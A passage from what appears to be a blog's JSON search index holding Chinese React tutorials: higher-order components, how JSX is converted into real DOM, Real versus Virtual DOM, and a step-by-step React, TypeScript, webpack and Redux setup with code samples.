withLogging(SomeComponent);\n\n三、应用场景通过上面的了解，高阶组件能够提高代码的复用性和灵活性，在实际应用中，常常用于与核心业务无关但又在多个模块使用的功能，如权限控制、日志记录、数据校验、异常处理、统计上报等\n举个例子，存在一个组件，需要从缓存中获取数据，然后渲染。一般情况，我们会如下编写：\nimport React, &#123; Component &#125; from &#x27;react&#x27;class MyComponent extends Component &#123;  componentWillMount() &#123;      let data = localStorage.getItem(&#x27;data&#x27;);      this.setState(&#123;data&#125;);  &#125;    render() &#123;    return &lt;div&gt;&#123;this.state.data&#125;&lt;/div&gt;  &#125;&#125;\n\n上述代码当然可以实现该功能，但是如果还有其他组件也有类似功能的时候，每个组件都需要重复写componentWillMount中的代码，这明显是冗杂的\n下面就可以通过高价组件来进行改写，如下：\nimport React, &#123; Component &#125; from &#x27;react&#x27;function withPersistentData(WrappedComponent) &#123;  return class extends Component &#123;    componentWillMount() &#123;      let data = localStorage.getItem(&#x27;data&#x27;);        this.setState(&#123;data&#125;);    &#125;        render() &#123;      // 通过&#123;...this.props&#125; 把传递给当前组件的属性继续传递给被包装的组件WrappedComponent      return &lt;WrappedComponent data=&#123;this.state.data&#125; &#123;...this.props&#125; /&gt;    &#125;  &#125;&#125;class MyComponent2 extends Component &#123;    render() &#123;    return &lt;div&gt;&#123;this.props.data&#125;&lt;/div&gt;  &#125;&#125;const MyComponentWithPersistentData = withPersistentData(MyComponent2)\n\n再比如组件渲染性能监控，如下：\nclass Home extends React.Component &#123;    render() &#123;        return (&lt;h1&gt;Hello World.&lt;/h1&gt;);    &#125;&#125;function withTiming(WrappedComponent) &#123;    return class extends WrappedComponent &#123;        constructor(props) &#123;            super(props);            this.start = 0;            this.end = 0;        &#125;        componentWillMount() &#123;            super.componentWillMount &amp;&amp; super.componentWillMount();            this.start = Date.now();        &#125;        componentDidMount() &#123;            super.componentDidMount &amp;&amp; super.componentDidMount();            this.end = Date.now();            console.log(`$&#123;WrappedComponent.name&#125; 组件渲染时间为 $&#123;this.end - this.start&#125; ms`);        &#125;        render() &#123;            return super.render();        &#125;    &#125;;&#125;export default withTiming(Home);","categories":["框架"],"tags":["React"]},{"title":"React-Jsx转换成真实DOM过程","url":"/2020/02/03/React/React-Jsx%E8%BD%AC%E6%8D%A2%E6%88%90%E7%9C%9F%E5%AE%9EDOM%E8%BF%87%E7%A8%8B/","content":"一、是什么react通过将组件编写的JSX映射到屏幕，以及组件中的状态发生了变化之后 React会将这些「变化」更新到屏幕上\nJSX通过babel最终转化成React.createElement这种形式，例如：\n&lt;div&gt;  &lt; img src=&quot;avatar.png&quot; className=&quot;profile&quot; /&gt;  &lt;Hello /&gt;&lt;/div&gt;\n\n会被bebel转化成如下：\nReact.createElement(  &quot;div&quot;,  null,  React.createElement(&quot;img&quot;, &#123;    src: &quot;avatar.png&quot;,    className: &quot;profile&quot;  &#125;),  React.createElement(Hello, null));\n\n在转化过程中，babel在编译时会判断 JSX 中组件的首字母：\n\n当首字母为小写时，其被认定为原生 DOM 标签，createElement 的第一个变量被编译为字符串\n当首字母为大写时，其被认定为自定义组件，createElement 的第一个变量被编译为对象\n\n最终都会通过RenderDOM.render(...)方法进行挂载，如下：\nReactDOM.render(&lt;App /&gt;,  document.getElementById(&quot;root&quot;));\n\n二、过程在react中，节点大致可以分成四个类别：\n\n原生标签节点\n文本节点\n函数组件\n类组件\n\n如下所示：\nclass ClassComponent extends Component &#123;  static defaultProps = &#123;    color: &quot;pink&quot;  &#125;;  render() &#123;    return (      &lt;div className=&quot;border&quot;&gt;        &lt;h3&gt;ClassComponent&lt;/h3&gt;        &lt;p className=&#123;this.props.color&#125;&gt;&#123;this.props.name&#125;&lt;/p &gt;      &lt;/div&gt;    );  &#125;&#125;function FunctionComponent(props) &#123;  return (    &lt;div className=&quot;border&quot;&gt;      FunctionComponent      &lt;p&gt;&#123;props.name&#125;&lt;/p &gt;    &lt;/div&gt;  );&#125;const jsx = (  &lt;div className=&quot;border&quot;&gt;    &lt;p&gt;xx&lt;/p &gt;    &lt; a href=&quot; &quot;&gt;xxx&lt;/ a&gt;    &lt;FunctionComponent name=&quot;函数组件&quot; /&gt;    &lt;ClassComponent name=&quot;类组件&quot; color=&quot;red&quot; /&gt;  &lt;/div&gt;);\n\n这些类别最终都会被转化成React.createElement这种形式\nReact.createElement其被调用时会传⼊标签类型type，标签属性props及若干子元素children，作用是生成一个虚拟Dom对象，如下所示：\nfunction createElement(type, config, ...children) &#123;    if (config) &#123;        delete config.__self;        delete config.__source;    &#125;    // ! 源码中做了详细处理，⽐如过滤掉key、ref等    const props = &#123;        ...config,        children: children.map(child =&gt;   typeof child === &quot;object&quot; ? child : createTextNode(child)  )    &#125;;    return &#123;        type,        props    &#125;;&#125;function createTextNode(text) &#123;    return &#123;        type: TEXT,        props: &#123;            children: [],            nodeValue: text        &#125;    &#125;;&#125;export default &#123;    createElement&#125;;\n\ncreateElement会根据传入的节点信息进行一个判断：\n\n如果是原生标签节点， type 是字符串，如div、span\n如果是文本节点， type就没有，这里是 TEXT\n如果是函数组件，type 是函数名\n如果是类组件，type 是类名\n\n虚拟DOM会通过ReactDOM.render进行渲染成真实DOM，使用方法如下：\nReactDOM.render(element, container[, callback])\n\n当首次调用时，容器节点里的所有 DOM 元素都会被替换，后续的调用则会使用 React 的 diff算法进行高效的更新\n如果提供了可选的回调函数callback，该回调将在组件被渲染或更新之后被执行\nrender大致实现方法如下：\nfunction render(vnode, container) &#123;    console.log(&quot;vnode&quot;, vnode); // 虚拟DOM对象    // vnode _&gt; node    const node = createNode(vnode, container);    container.appendChild(node);&#125;// 创建真实DOM节点function createNode(vnode, parentNode) &#123;    let node = null;    const &#123;type, props&#125; = vnode;    if (type === TEXT) &#123;        node = document.createTextNode(&quot;&quot;);    &#125; else if (typeof type === &quot;string&quot;) &#123;        node = document.createElement(type);    &#125; else if (typeof type === &quot;function&quot;) &#123;        node = type.isReactComponent            ? updateClassComponent(vnode, parentNode)        : updateFunctionComponent(vnode, parentNode);    &#125; else &#123;        node = document.createDocumentFragment();    &#125;    reconcileChildren(props.children, node);    updateNode(node, props);    return node;&#125;// 遍历下子vnode，然后把子vnode-&gt;真实DOM节点，再插入父node中function reconcileChildren(children, node) &#123;    for (let i = 0; i &lt; children.length; i++) &#123;        let child = children[i];        if (Array.isArray(child)) &#123;            for (let j = 0; j &lt; child.length; j++) &#123;                render(child[j], node);            &#125;        &#125; else &#123;            render(child, node);        &#125;    &#125;&#125;function updateNode(node, nextVal) &#123;    Object.keys(nextVal)        .filter(k =&gt; k !== &quot;children&quot;)        .forEach(k =&gt; &#123;        if (k.slice(0, 2) === &quot;on&quot;) &#123;            let eventName = k.slice(2).toLocaleLowerCase();            node.addEventListener(eventName, nextVal[k]);        &#125; else &#123;            node[k] = nextVal[k];        &#125;    &#125;);&#125;// 返回真实dom节点// 执行函数function updateFunctionComponent(vnode, parentNode) &#123;    const &#123;type, props&#125; = vnode;    let vvnode = type(props);    const node = createNode(vvnode, parentNode);    return node;&#125;// 返回真实dom节点// 先实例化，再执行render函数function updateClassComponent(vnode, parentNode) &#123;    const &#123;type, props&#125; = vnode;    let cmp = new type(props);    const vvnode = cmp.render();    const node = createNode(vvnode, parentNode);    return node;&#125;export default &#123;    render&#125;;\n\n三、总结在react源码中，虚拟Dom转化成真实Dom整体流程如下图所示：\n\n其渲染流程如下所示：\n\n使用React.createElement或JSX编写React组件，实际上所有的 JSX 代码最后都会转换成React.createElement(…) ，Babel帮助我们完成了这个转换的过程。\ncreateElement函数对key和ref等特殊的props进行处理，并获取defaultProps对默认props进行赋值，并且对传入的孩子节点进行处理，最终构造成一个虚拟DOM对象\nReactDOM.render将生成好的虚拟DOM渲染到指定容器上，其中采用了批处理、事务等机制并且对特定浏览器进行了性能优化，最终转换为真实DOM\n\n","categories":["React"],"tags":["React"]},{"title":"Real DOM 和 Virtual DOM 的区别","url":"/2020/02/06/React/React-Real%20DOM%20%E5%92%8C%20Virtual%20DOM%20%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"一、是什么Real DOM，真实 DOM，意思为文档对象模型，是一个结构化文本的抽象，在页面渲染出的每一个结点都是一个真实 DOM 结构，如下：\n\nVirtual Dom，本质上是以 JavaScript 对象形式存在的对 DOM 的描述\n创建虚拟 DOM 目的就是为了更好将虚拟的节点渲染到页面视图中，虚拟 DOM 对象的节点与真实 DOM的属性一一照应\n在 React 中，JSX 是其一大特性，可以让你在 JS 中通过使用 XML 的方式去直接声明界面的 DOM结构\n// 创建 h1 标签，右边千万不能加引号const vDom = &lt;h1&gt;Hello World&lt;/h1&gt;; // 找到 &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; 节点const root = document.getElementById(&quot;root&quot;); // 把创建的 h1 标签渲染到 root 节点上ReactDOM.render(vDom, root); \n\n上述中，ReactDOM.render() 用于将你创建好的虚拟 DOM 节点插入到某个真实节点上，并渲染到页面上\nJSX 实际是一种语法糖，在使用过程中会被 babel 进行编译转化成 JS 代码，上述 VDOM 转化为如下：\nconst vDom = React.createElement(  &#x27;h1&#x27;，  &#123; className: &#x27;hClass&#x27;, id: &#x27;hId&#x27; &#125;,  &#x27;hello world&#x27;)\n\n可以看到，JSX 就是为了简化直接调用 React.createElement() 方法：\n\n第一个参数是标签名，例如 h1、span、table…\n第二个参数是个对象，里面存着标签的一些属性，例如 id、class 等\n第三个参数是节点中的文本\n\n通过 console.log(VDOM)，则能够得到虚拟 VDOM 消息\n\n所以可以得到，JSX 通过 babel 的方式转化成 React.createElement 执行，返回值是一个对象，也就是虚拟 DOM\n二、区别两者的区别如下：\n\n虚拟 DOM 不会进行排版与重绘操作，而真实 DOM 会频繁重排与重绘\n虚拟 DOM 的总损耗是“虚拟 DOM 增删改+真实 DOM 差异增删改+排版与重绘”，真实 DOM 的总损耗是“真实 DOM 完全增删改+排版与重绘”\n\n拿以前文章 (opens new window)举过的例子：\n传统的原生 api 或 jQuery 去操作 DOM 时，浏览器会从构建 DOM 树开始从头到尾执行一遍流程\n当你在一次操作时，需要更新 10 个 DOM 节点，浏览器没这么智能，收到第一个更新 DOM 请求后，并不知道后续还有 9 次更新操作，因此会马上执行流程，最终执行 10 次流程\n而通过 VNode，同样更新 10 个 DOM 节点，虚拟 DOM 不会立即操作 DOM，而是将这 10 次更新的 diff 内容保存到本地的一个 js 对象中，最终将这个 js 对象一次性 attach 到 DOM 树上，避免大量的无谓计算\n三、优缺点真实 DOM 的优势：\n\n易用\n\n缺点：\n\n效率低，解析速度慢，内存占用量过高\n性能差：频繁操作真实 DOM，易于导致重绘与回流\n\n使用虚拟 DOM 的优势如下：\n\n简单方便：如果使用手动操作真实 DOM 来完成页面，繁琐又容易出错，在大规模应用下维护起来也很困难\n性能方面：使用 Virtual DOM，能够有效避免真实 DOM 数频繁更新，减少多次引起重绘与回流，提高性能\n跨平台：React 借助虚拟 DOM，带来了跨平台的能力，一套代码多端运行\n\n缺点：\n\n在一些性能要求极高的应用中虚拟 DOM 无法进行针对性的极致优化\n首次渲染大量 DOM 时，由于多了一层虚拟 DOM 的计算，速度比正常稍慢\n\n","categories":["框架"],"tags":["React"]},{"title":"React-Redux总结-配置Ts","url":"/2020/02/14/React/React-Redux-%E9%85%8D%E7%BD%AETs/","content":"第二部分 结合React实践一、环境配置1.1 初始化项目\n生成一个目录ts_react_demo，输入npm init -y初始化项目\n然后在项目里我们需要一个.gitignore来忽略指定目录不传到git上\n进入.gitignore输入我们需要忽略的目录，一般是node_modules\n\n// .gitignorenode_modules\n\n1.2 安装依赖\n接下来我们准备下载相应的依赖包，这里需要了解一个概念，就是类型定义文件\n\n1.2.1 类型定义文件\n因为目前主流的第三方库都是以javascript编写的，如果用typescript开发，会导致在编译的时候会出现很多找不到类型的提示，那么如果让这些库也能在ts中使用呢？\n\n\n类型定义文件(*.d.ts)就是能够让编辑器或者插件来检测到第三方库中js的静态类型，这个文件是以.d.ts结尾- 比如说react的类型定义文件：https://github.com/DefinitelyTyped/DefinitelyTyped/tree/master/types/react\n在typescript2.0中，是使用@type来进行类型定义，当我们使用@type进行类型定义，typescript会默认查看./node_modules/@types文件夹，可以通过这样来安装这个库的定义库npm install @types/react --save\n\n1.2.2 相关依赖包React相关\n- react // react的核心文件- @types/react // 声明文件- react-dom // react dom的操作包- @types/react-dom - react-router-dom // react路由包- @types/react-router-dom- react-redux- @types/react-redux- redux-thunk  // 中间件- @types/redux-logger- redux-logger // 中间件- connected-react-router## 执行安装依赖包npm i react react-dom @types/react @types/react-dom react-router-dom @types/react-router-dom react-redux @types/react-redux redux-thunk redux-logger @types/redux-logger connected-react-router -S\n\nwebpack相关\n- webpack // webpack的核心包- webpack-cli // webapck的工具包- webpack-dev-server // webpack的开发服务- html-webpack-plugin // webpack的插件，可以生成index.html文件npm i webpack webpack-cli webpack-dev-server html-webpack-plugin -D\n\n\n这里的-D相当于--save-dev的缩写，下载开发环境的依赖包\n\ntypescript相关\n- typescript // ts的核心包- ts-loader // 把ts编译成指定语法比如es5 es6等的工具，有了它，基本不需要babel了，因为它会把我们的代码编译成es5- source-map-loader // 用于开发环境中调试ts代码npm i typescript ts-loader source-map-loader -D\n\n\n从上面可以看出，基本都是模块和声明文件都是一对对出现的，有一些不是一对对出现，就是因为都集成到一起去了\n声明文件可以在node_modules/@types/xx/xx中找到\n\n1.3 Typescript config配置\n首先我们要生成一个tsconfig.json来告诉ts-loader怎样去编译这个ts代码\n\ntsc --init\n\n\n会在项目中生成了一个tsconfig.json文件，接下来进入这个文件，来修改相关配置\n\n// tsconfig.json&#123;  // 编译选项  &quot;compilerOptions&quot;: &#123;    &quot;target&quot;: &quot;es5&quot;, // 编译成es5语法    &quot;module&quot;: &quot;commonjs&quot;, // 模块的类型    &quot;outDir&quot;: &quot;./dist&quot;, // 编译后的文件目录    &quot;sourceMap&quot;: true, // 生成sourceMap方便我们在开发过程中调试    &quot;noImplicitAny&quot;: true, // 每个变量都要标明类型    &quot;jsx&quot;: &quot;react&quot;, // jsx的版本,使用这个就不需要额外使用babel了，会编译成React.createElement  &#125;,  // 为了加快整个编译过程，我们指定相应的路径  &quot;include&quot;: [    &quot;./src/**/*&quot;  ]&#125;\n\n1.4 webpack配置\n在./src/下创建一个index.html文件，并且添加&#96;&#96;标签\n\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&#x27;app&#x27;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n在./下创建一个webpack配置文件webpack.config.js\n\n// ./webpack.config.js// 引入webpackconst webpack = require(&quot;webpack&quot;);// 引入webpack插件 生成index.html文件const HtmlWebpackPlugin = require(&quot;html-webpack-plugin&quot;);const path = require(&quot;path&quot;)// 把模块导出module.exports = &#123;  // 以前是jsx，因为我们用typescript写，所以这里后缀是tsx  entry:&quot;./src/index.tsx&quot;,  // 指定模式为开发模式  mode:&quot;development&quot;,  // 输出配置  output:&#123;    // 输出目录为当前目录下的dist目录    path:path.resolve(__dirname,&#x27;dist&#x27;),    // 输出文件名    filename:&quot;index.js&quot;  &#125;,  // 为了方便调试，还要配置一下调试工具  devtool:&quot;source-map&quot;,  // 解析路径，查找模块的时候使用  resolve:&#123;    // 一般写模块不会写后缀，在这里配置好相应的后缀，那么当我们不写后缀时，会按照这个后缀优先查找    extensions:[&quot;.ts&quot;,&#x27;.tsx&#x27;,&#x27;.js&#x27;,&#x27;.json&#x27;]  &#125;,  // 解析处理模块的转化  module:&#123;    // 遵循的规则    rules:[      &#123;        // 如果这个模块是.ts或者.tsx，则会使用ts-loader把代码转成es5        test:/\\.tsx?$/,        loader:&quot;ts-loader&quot;      &#125;,      &#123;        // 使用sourcemap调试        // enforce:pre表示这个loader要在别的loader执行前执行        enforce:&quot;pre&quot;,        test:/\\.js$/,        loader:&quot;source-map-loader&quot;      &#125;    ]  &#125;,  // 插件的配置  plugins:[    // 这个插件是生成index.html    new HtmlWebpackPlugin(&#123;      // 以哪个文件为模板，模板路径      template:&quot;./src/index.html&quot;,      // 编译后的文件名      filename:&quot;index.html&quot;    &#125;),    new webpack.HotModuleReplacementPlugin()  ],  // 开发环境服务配置  devServer:&#123;    // 启动热更新,当模块、组件有变化，不会刷新整个页面，而是局部刷新    // 需要和插件webpack.HotModuleReplacementPlugin配合使用    hot:true,     // 静态资源目录    contentBase:path.resolve(__dirname,&#x27;dist&#x27;)  &#125;&#125;\n\n\n那么我们怎么运行这个webpack.config.js呢？这就需要我们在package.json配置一下脚本\n\n\n在package.json里的script，添加build和dev的配置\n\n&#123;  &quot;name&quot;: &quot;ts_react_demo&quot;,  &quot;version&quot;: &quot;1.0.0&quot;,  &quot;description&quot;: &quot;&quot;,  &quot;main&quot;: &quot;index.js&quot;,  &quot;scripts&quot;: &#123;    &quot;build&quot;: &quot;webpack&quot;,    &quot;dev&quot;:&quot;webpack-dev-server&quot;  &#125;,  &quot;keywords&quot;: [],  &quot;author&quot;: &quot;&quot;,  &quot;license&quot;: &quot;ISC&quot;,  &quot;dependencies&quot;: &#123;    &quot;@types/react&quot;: &quot;^16.7.13&quot;,    &quot;@types/react-dom&quot;: &quot;^16.0.11&quot;,    &quot;@types/react-redux&quot;: &quot;^6.0.10&quot;,    &quot;@types/react-router-dom&quot;: &quot;^4.3.1&quot;,    &quot;connected-react-router&quot;: &quot;^5.0.1&quot;,    &quot;react&quot;: &quot;^16.6.3&quot;,    &quot;react-dom&quot;: &quot;^16.6.3&quot;,    &quot;react-redux&quot;: &quot;^6.0.0&quot;,    &quot;react-router-dom&quot;: &quot;^4.3.1&quot;,    &quot;redux-logger&quot;: &quot;^3.0.6&quot;,    &quot;redux-thunk&quot;: &quot;^2.3.0&quot;  &#125;,  &quot;devDependencies&quot;: &#123;    &quot;html-webpack-plugin&quot;: &quot;^3.2.0&quot;,    &quot;source-map-loader&quot;: &quot;^0.2.4&quot;,    &quot;ts-loader&quot;: &quot;^5.3.1&quot;,    &quot;typescript&quot;: &quot;^3.2.1&quot;,    &quot;webpack&quot;: &quot;^4.27.1&quot;,    &quot;webpack-cli&quot;: &quot;^3.1.2&quot;,    &quot;webpack-dev-server&quot;: &quot;^3.1.10&quot;  &#125;&#125;\n\n\n因为入口文件是index.tsx，那么我们在./src/下创建一个index.tsx，并且在里面写入一段代码，看看webpack是否能够正常编译\n因为我们在webpack.config.js中entry设置的入口文件是index.tsx，并且在module中的rules会识别到.tsx格式的文件，然后执行相应的ts-loader\n\n// ./src/index.tsxconsole.log(&quot;hello poetries&quot;)\n\n\n接下来我们npm run build一下，看看能不能正常编译\n编译成功，我们可以看看./dist/下生成了index.html index.js index.js.map三个文件\n那么我们在开发过程中，不会每次都npm run build来看修改的结果，那么我们平时开发过程中可以使用npm run dev。这样就启动成功了一个http://localhost:8080/的服务了。\n接下来我们看看热更新是否配置正常，在./src/index.tsx中新增一个console.log(&#39;hello poetries&#39;)，我们发现浏览器的控制台会自动打印出这一个输出，说明配置正常了\n\n二、React组件2.1 写一个计数器组件\n首先我们在./src/下创建一个文件夹components，然后在./src/components/下创建文件Counter.tsx\n\n// ./src/components/Counter.tsx// import React from &quot;react&quot;; // 之前的写法// 在ts中引入的写法import * as React from &quot;react&quot;;export default class CounterComponent extends React.Component&#123;  // 状态state  state = &#123;    number:0  &#125;  render()&#123;    return(      &lt;div&gt;        &lt;p&gt;&#123;this.state.number&#125;&lt;/p&gt;        &lt;button onClick=&#123;()=&gt;this.setState(&#123;number:this.state.number + 1&#125;)&#125;&gt;+&lt;/button&gt;      &lt;/div&gt;    )  &#125;&#125;\n\n\n我们发现，其实除了引入import * as React from &quot;react&quot;以外，其余的和之前的写法没什么不同。\n\n\n接下来我们到./src/index.tsx中把这个组件导进来\n\n// ./src/index.tsximport * as React from &quot;react&quot;;import * as ReactDom from &quot;react-dom&quot;;import CounterComponent from &quot;./components/Counter&quot;;// 把我们的CounterComponent组件渲染到id为app的标签内ReactDom.render(&lt;CounterComponent /&gt;,document.getElementById(&quot;app&quot;))\n\n\n这样我们就把这个组件引进来了，接下来我们看下是否能够成功跑起来\n\n\n\n到目前为止，感觉用ts写react还是跟以前差不多，没什么区别，要记住，ts最大的特点就是类型检查，可以检验属性的状态类型\n\n假设我们需要在./src/index.tsx中给&#96;&#96;传一个属性name，而CounterComponent组件需要对这个传入的name进行类型校验，比如说只允许传字符串\n\n./src/index.tsx中修改一下\n\nReactDom.render(&lt;CounterComponent name=&quot;poetries&quot; /&gt;,document.getElementById(&quot;app&quot;))\n\n\n然后需要在./src/components/Counter.tsx中写一个接口来对这个name进行类型校验\n\n// import React from &quot;react&quot;; // 之前的写法// 在ts中引入的写法import * as React from &quot;react&quot;;// 写一个接口对name进行类型校验// 如果我们不写校验的话，在外部传name进来会报错的interface IProps&#123;    name:string,&#125;// 我们还可以用接口约束state的状态interface IState&#123;    number: number&#125;// 把接口约束的规则写在这里// 如果传入的name不符合类型会报错// 如果state的number属性不符合类型也会报错export default class CounterComponent extends React.Component&lt;IProps,IState&gt;&#123;  // 状态state  state = &#123;    number:0  &#125;  render()&#123;    return(        &lt;div&gt;        &lt;p&gt;&#123;this.state.number&#125;&lt;/p&gt;        &lt;p&gt;&#123;this.props.name&#125;&lt;/p&gt;        &lt;button onClick=&#123;()=&gt;this.setState(&#123;number:this.state.number + 1&#125;)&#125;&gt;+&lt;/button&gt;      &lt;/div&gt;    )  &#125;&#125;\n\n2.2 结合Redux使用2.2.1 基础使用\n上面state中的number就不放在组件里了，我们放到redux中，接下来我们使用redux\n首先在./src/创建store目录，然后在./src/store/创建一个文件index.tsx\n\n// .src/store/index.tsximport &#123; createStore &#125; from &quot;redux&quot;;// 引入reducersimport reducers from &quot;./reducers&quot;;// 接着创建仓库let store = createStore(reducers);// 导出store仓库export default store;\n\n\n然后我们需要创建一个reducers，在./src/store/创建一个目录reducers，该目录下再创建一个文件index.tsx。\n但是我们还需要对reducers中的函数参数进行类型校验，而且这个类型校验很多地方需要复用，那么我们需要把这个类型校验单独抽离出一个文件。\n那么我们需要在./src/下创建一个types目录，该目录下创建一个文件index.tsx\n\n// ./src/types/index.tsx// 导出一个接口export interface Store&#123;  // 我们需要约束的属性和类型  number:number&#125;\n\n\n回到./src/store/reducers/index.tsx\n\n// 导入类型校验的接口// 用来约束state的import &#123; Store &#125; from &quot;../../types/index&quot;// 我们需要给number赋予默认值let initState:Store = &#123; number:0 &#125;// 把接口写在state:Storeexport default function (state:Store=initState,action) &#123;  // 拿到老的状态state和新的状态action  // action是一个动作行为，而这个动作行为，在计数器中是具备 加 或 减 两个功能&#125;\n\n\n上面这段代码暂时先这样，因为需要用到action，我们现在去配置一下action相关的，首先我们在./src/store下创建一个actions目录，并且在该目录下创建文件counter.tsx\n因为配置./src/store/actions/counter.tsx会用到动作类型，而这个动作类型是属于常量，为了更加规范我们的代码，我们在./src/store/下创建一个action-types.tsx，里面写相应常量\n\n// ./src/store/action-types.tsxexport const ADD = &quot;ADD&quot;;export const SUBTRACT = &quot;SUBTRACT&quot;;\n\n\n回到./src/store/actions/counter.tsx\n\n// ./src/store/actions/counter.tsximport * as types from &quot;../action-types&quot;;export default &#123;  add()&#123;    // 需要返回一个action对象    // type为动作的类型    return &#123; type: types.ADD&#125;  &#125;,  subtract()&#123;    // 需要返回一个action对象    // type为动作的类型    return &#123; type: types.SUBTRACT&#125;  &#125;&#125;\n\n\n我们可以想一下，上面return &#123; type:types.ADD &#125;实际上是返回一个action对象，将来使用的时候，是会传到./src/store/reducers/index.tsx的action中，那么我们怎么定义这个action的结构呢？\n\n// ./src/store/actions/counter.tsximport * as types from &quot;../action-types&quot;;// 定义两个接口，分别约束add和subtract的type类型export interface Add&#123;  type:typeof types.ADD&#125;export interface Subtract&#123;  type:typeof types.SUBTRACT&#125;// 再导出一个type// type是用来给类型起别名的// 这个actions里是一个对象，会有很多函数，每个函数都会返回一个action// 而 ./store/reducers/index.tsx中的action会是下面某一个函数的返回值export type Action = Add | Subtract// 把上面定义好的接口作用于下面// 约束返回值的类型export default &#123;  add():Add&#123;    // 需要返回一个action对象    // type为动作的类型    return &#123; type: types.ADD&#125;  &#125;,  subtract():Subtract&#123;    // 需要返回一个action对象    // type为动作的类型    return &#123; type: types.SUBTRACT&#125;  &#125;&#125;\n\n\n接着我们回到./store/reducers/index.tsx\n\n经过上面一系列的配置，我们可以给action使用相应的接口约束了并且根据不同的action动作行为来进行不同的处理\n// ./store/reducers/index.tsx// 导入类型校验的接口// 用来约束state的import &#123; Store &#125; from &quot;../../types/index&quot;// 导入约束action的接口import &#123; Action &#125; from &quot;../actions/counter&quot;// 引入action动作行为的常量import * as types from &quot;../action-types&quot;// 我们需要给number赋予默认值let initState:Store = &#123; number:0 &#125;// 把接口写在state:Storeexport default function (state:Store=initState,action:Action) &#123;  // 拿到老的状态state和新的状态action  // action是一个动作行为，而这个动作行为，在计数器中是具备 加 或 减 两个功能  // 判断action的行为类型  switch (action.type) &#123;    case types.ADD:        // 当action动作行为是ADD的时候，给number加1        return &#123; number:state.number + 1 &#125;      break;    case types.SUBTRACT:        // 当action动作行为是SUBTRACT的时候，给number减1        return &#123; number:state.number - 1 &#125;      break;    default:        // 当没有匹配到则返回原本的state        return state      break;  &#125;&#125;\n\n\n接下来，我们怎么样把组件和仓库建立起关系呢\n\n首先进入./src/index.tsx\n// ./src/index.tsximport * as React from &quot;react&quot;;import * as ReactDom from &quot;react-dom&quot;;// 引入redux这个库的Provider组件import &#123; Provider &#125; from &quot;react-redux&quot;;// 引入仓库import store from &#x27;./store&#x27;import CounterComponent from &quot;./components/Counter&quot;;// 用Provider包裹CounterComponent组件// 并且把store传给Provider// 这样Provider可以向它的子组件提供storeReactDom.render((  &lt;Provider store=&#123;store&#125;&gt;    &lt;CounterComponent name=&quot;poetries&quot;/&gt;  &lt;/Provider&gt;),document.getElementById(&quot;app&quot;))\n\n\n我们到组件内部建立连接，./src/components/Counter.tsx\n\n// import React from &quot;react&quot;; // 之前的写法// 在ts中引入的写法import * as React from &quot;react&quot;;// 引入connect，让组件和仓库建立连接import &#123; connect &#125; from &quot;react-redux&quot;;// 引入actions，用于传给connectimport actions from &quot;../store/actions/counter&quot;;// 引入接口约束import &#123; Store &#125; from &quot;../types&quot;;// 接口约束interface IProps&#123;  number:number,  name:string, //如果我们不写校验的话，在外部传name进来会报错的  // add是一个函数  add:any,  // subtract是一个函数  subtract:any&#125;// 我们还可以用接口约束state的状态interface IState&#123;    number: number&#125;// 把接口约束的规则写在这里// 如果传入的name不符合类型会报错// 如果state的number属性不符合类型也会报错class CounterComponent extends React.Component&lt;IProps,IState&gt;&#123;  // 状态state  state = &#123;    number:0  &#125;  render()&#123;    // 利用解构赋值取出    // 这里比如和IProps保持一致，不对应则会报错，因为接口约束了必须这样    let &#123; number,add,subtract &#125; = this.props    return(        &lt;div&gt;            &lt;h1&gt;&#123;this.props.name&#125;&lt;/h1&gt;            &lt;button onClick=&#123;add&#125;&gt;+&lt;/button&gt;&lt;br /&gt;            &lt;button onClick=&#123;subtract&#125;&gt;-&lt;/button&gt;              &lt;p&gt;&#123;number&#125;&lt;/p&gt;      &lt;/div&gt;    )  &#125;&#125;// 这个connect需要执行两次，第二次需要我们把这个组件CounterComponent传进去// connect第一次执行，需要两个参数，// 需要传给connect的函数let mapStateToProps = function (state:Store) &#123;    return state&#125;  export default connect(    mapStateToProps,    actions)(CounterComponent);\n\n这时候看到成功执行了\n\n\n其实搞来搞去，跟原来的写法差不多，主要就是ts会进行类型检查。\n如果对number进行异步修改，该怎么处理？这就需要我们用到redux-thunk\n\n\n接着我们回到./src/store/index.tsx\n\n// 需要使用到thunk，所以引入中间件applyMiddlewareimport &#123; createStore, applyMiddleware &#125; from &quot;redux&quot;;// 引入reducersimport reducers from &quot;./reducers&quot;;// 引入redux-thunk，处理异步// 现在主流处理异步的是saga和thunkimport thunk from &quot;redux-thunk&quot;;// 引入日志import logger from &quot;redux-logger&quot;;// 接着创建仓库和中间件let store = createStore(reducers, applyMiddleware(thunk,logger));// 导出store仓库export default store;\n\n\n接着我们回来./src/store/actions，新增一个异步的动作行为\n\n// ./src/store/actions/counter.tsximport * as types from &quot;../action-types&quot;;// 定义两个接口，分别约束add和subtract的type类型export interface Add&#123;  type:typeof types.ADD&#125;export interface Subtract&#123;  type:typeof types.SUBTRACT&#125;// 再导出一个type// type是用来给类型起别名的// 这个actions里是一个对象，会有很多函数，每个函数都会返回一个action// 而 ./store/reducers/index.tsx中的action会是下面某一个函数的返回值export type Action = Add | Subtract// 把上面定义好的接口作用于下面// 约束返回值的类型export default &#123;  add():Add&#123;    // 需要返回一个action对象    // type为动作的类型    return &#123; type: types.ADD&#125;  &#125;,  subtract():Subtract&#123;    // 需要返回一个action对象    // type为动作的类型    return &#123; type: types.SUBTRACT&#125;  &#125;,  // 一秒后才执行这个行为  // ++  addAsync():any&#123;    return function (dispatch:any,getState:any) &#123;      setTimeout(function()&#123;        // 当1秒过后，会执行dispatch，派发出去，然后改变仓库的状态        dispatch(&#123;type:types.ADD&#125;)      &#125;, 1000);    &#125;  &#125;&#125;\n\n\n到./src/components/Counter.tsx组件内，使用这个异步\n\n2.2.2 